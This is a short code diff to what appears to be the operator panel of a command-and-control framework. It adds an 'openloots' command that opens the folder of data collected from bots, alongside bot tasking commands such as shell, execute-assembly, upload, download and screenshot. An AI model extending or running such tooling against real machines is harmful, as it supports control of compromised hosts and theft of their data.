@@ -62,7 +62,7 @@ QTextBrowser {
         self.socket_io_client.start(self.url, self.token, self.namespace)
 
 
-        self.commands = ['help', 'pingbot', 'killbot', 'cd', 'mkdir', 'rmdir', 'ls', 'rm', 'pwd', 'ps', 'whoami', 'shell', 'execute-assembly','upload','download', 'screenshot', 'cat', 'clear']
+        self.commands = ['help', 'pingbot', 'killbot', 'cd', 'openloots', 'mkdir', 'rmdir', 'ls', 'rm', 'pwd', 'ps', 'whoami', 'shell', 'execute-assembly','upload','download', 'screenshot', 'cat', 'clear']
         self.completer = QCompleter( self.commands, self.bot_send_task_line_edit)
         self.completer.setCompletionMode(QCompleter.InlineCompletion)
 
@@ -192,6 +192,12 @@ QTextBrowser {
             if ret is not QMessageBox.Ok:
                 self.bot_send_task_line_edit.clear()
                 return
+            
+        if text == "openloots":
+            os.startfile(self.bot_loot_dir)
+            self.update_bot_terminal(text)
+            self.bot_send_task_line_edit.clear()
+            return
         
         PattayaPanelUtil.panel_log_info(f"Enter {text} command to {self.bot['username']}")
         self.update_bot_terminal(text)
